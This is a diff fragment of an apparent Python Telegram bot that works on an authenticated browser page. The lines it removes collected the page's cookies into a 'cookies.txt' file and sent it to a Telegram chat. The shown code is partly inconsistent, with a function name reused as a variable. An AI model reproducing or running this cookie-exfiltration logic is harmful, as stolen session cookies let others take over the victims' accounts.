@@ -521,17 +521,10 @@ def listen(message):
             """
             
             # Continue with further actions on the authenticated
-
             dad.send_message(message.chat.id, f'page:{page}')
 
             # Get the cookies
             cookies = cookies(page)
-
-            if cookie_message != '':
-                with io.BytesIO() as file:
-                    file.write(cookie_message.encode())
-                    file.seek(0)
-                    dad.send_document(message.chat.id, file, caption=f'{page.url}', visible_file_name='cookies.txt')
 
             html = page.content()
 
